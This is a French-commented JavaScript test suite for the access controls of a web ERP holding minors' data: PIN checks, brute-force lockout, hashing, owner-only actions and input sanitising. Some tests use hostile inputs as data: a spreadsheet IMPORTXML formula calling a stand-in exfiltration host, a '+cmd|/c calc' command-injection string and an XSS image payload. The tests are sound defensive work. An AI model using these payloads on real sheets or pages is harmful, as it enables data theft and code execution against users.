/**
 * Controle d'acces et garde-fous.
 *
 * L'ERP est deploye en application web Apps Script. Selon le deploiement, l'URL
 * peut etre atteinte par n'importe qui dans l'organisation, voire au-dela : le
 * code PIN est donc la seule barriere devant des donnees personnelles de mineurs.
 * Ces tests verifient qu'elle tient.
 */
const { charger } = require('./harness');
const { erpDeTest } = require('./fixtures');
const { groupe, test, egal, vrai, faux, contient, absent, leve } = global.T;

groupe('checkPin_ : la barriere', () => {
  const { erp } = charger(erpDeTest({ config: { PIN: '4242' } }));
  test('le bon code passe', () => vrai(erp.checkPin_('4242').ok));
  test('un code faux ne passe pas', () => faux(erp.checkPin_('0000').ok));
  test('un code vide ne passe pas', () => faux(erp.checkPin_('').ok));
  test('null ne passe pas', () => faux(erp.checkPin_(null).ok));
  test('undefined ne passe pas', () => faux(erp.checkPin_(undefined).ok));
  test('un prefixe du bon code ne passe pas', () => faux(erp.checkPin_('424').ok));
  test('le bon code avec un espace ne passe pas (comparaison stricte)', () => faux(erp.checkPin_('4242 ').ok));
});

groupe('checkPin_ : aucun PIN configure = acces refuse, pas acces libre', () => {
  const { erp } = charger(erpDeTest({ config: { PIN: '' } }));
  test('tout est refuse tant que le PIN n\'est pas pose', () => {
    faux(erp.checkPin_('').ok);
    faux(erp.checkPin_('nimporte').ok);
  });
  test('le code d\'erreur dit quoi faire', () => {
    egal(erp.checkPin_('').code, 'NOPIN');
    contient(erp.checkPin_('').message, 'onglet Config');
  });
  test('un PIN trop court est traite comme absent', () => {
    const { erp: e } = charger(erpDeTest({ config: { PIN: '12' } }));
    egal(e.checkPin_('12').code, 'NOPIN', 'un PIN de 2 caracteres ne doit pas ouvrir l\'ERP');
  });
});

groupe('checkPin_ : anti force brute', () => {
  const { erp } = charger(erpDeTest({ config: { PIN: '4242' } }));
  test('5 essais rates puis blocage', () => {
    for (let i = 0; i < 5; i++) faux(erp.checkPin_('0000').ok);
    egal(erp.checkPin_('0000').code, 'LOCK');
  });
  test('le blocage tient meme avec le BON code (sinon il ne sert a rien)', () => {
    egal(erp.checkPin_('4242').code, 'LOCK');
  });
  test('le message annonce le delai', () => contient(erp.checkPin_('4242').message, '15 minutes'));
});

groupe('checkPin_ : un essai reussi remet le compteur a zero', () => {
  const { erp } = charger(erpDeTest({ config: { PIN: '4242' } }));
  test('trois echecs puis une reussite puis trois echecs : pas de blocage', () => {
    for (let i = 0; i < 3; i++) erp.checkPin_('0000');
    vrai(erp.checkPin_('4242').ok);
    for (let i = 0; i < 3; i++) faux(erp.checkPin_('0000').ok);
    egal(erp.checkPin_('0000').code, 'PIN', 'ne doit pas etre bloque');
  });
});

groupe('api() : le routeur refuse avant de router', () => {
  const { erp } = charger(erpDeTest({ config: { PIN: '4242' } }));
  test('une action inconnue avec un bon PIN est refusee', () => {
    const r = JSON.parse(erp.api('actionQuiNExistePas', {}, '4242'));
    faux(r.ok);
  });
  test('une action valide avec un mauvais PIN est refusee', () => {
    const r = JSON.parse(erp.api('accueil', {}, 'mauvais'));
    faux(r.ok);
    egal(r.error, 'PIN');
  });
  test('seule l\'action info passe sans PIN, et elle ne livre rien de personnel', () => {
    const r = JSON.parse(erp.api('info', {}, ''));
    vrai(r.ok);
    const champs = Object.keys(r.data).sort().join(',');
    egal(champs, 'logo,nom,pinConfigure,tel,voc');
  });
  test('info annonce si un PIN est pose, sans jamais le reveler', () => {
    const r = JSON.parse(erp.api('info', {}, ''));
    egal(r.data.pinConfigure, true);
    absent(JSON.stringify(r), '4242');
  });
});

groupe('hash_ : le PIN n\'est jamais compare en clair', () => {
  const { erp } = charger(erpDeTest({ config: { PIN: '4242' } }));
  test('l\'empreinte est du SHA-256 hexadecimal', () => {
    const h = erp.hash_('4242');
    egal(h.length, 64);
    vrai(/^[0-9a-f]{64}$/.test(h));
  });
  test('deux codes differents ont deux empreintes differentes', () => {
    vrai(erp.hash_('4242') !== erp.hash_('4243'));
  });
  test('l\'empreinte est stable d\'un appel a l\'autre', () => {
    egal(erp.hash_('4242'), erp.hash_('4242'));
  });
});

groupe('proprietaireSeulement_ : setup et declencheurs reserves au proprietaire', () => {
  test('le proprietaire du classeur passe', () => {
    const { erp } = charger(Object.assign(erpDeTest(), { utilisateur: 'patron@example.org' }));
    erp.proprietaireSeulement_();
  });
  test('viaDeclencheurOuProprio_ refuse un triggerUid inconnu', () => {
    const { erp } = charger(erpDeTest());
    leve(() => erp.viaDeclencheurOuProprio_({ triggerUid: 'invente' }), 'declencheur');
  });
});

groupe('safeCell_ : injection de formule dans un Sheet', () => {
  const { erp } = charger(erpDeTest());
  test('un nom saisi en formule ne devient pas une formule', () => {
    egal(erp.safeCell_('=IMPORTXML("http://exfiltration.example","//a")')[0], "'");
  });
  test('la syntaxe +cmd des tableurs est neutralisee', () => {
    egal(erp.safeCell_('+cmd|/c calc')[0], "'");
  });
});

groupe('echappement HTML : une saisie de formulaire ne peut pas injecter', () => {
  const { erp } = charger(erpDeTest());
  test('les balises sont echappees dans un mail', () => {
    const h = erp.mailHtml_('<img src=x onerror=alert(1)>');
    absent(h, '<img');
    contient(h, '&lt;img');
  });
  test('les guillemets et apostrophes sont echappes', () => {
    contient(erp.mailHtml_('il a dit "bonjour"'), '&quot;');
  });
});
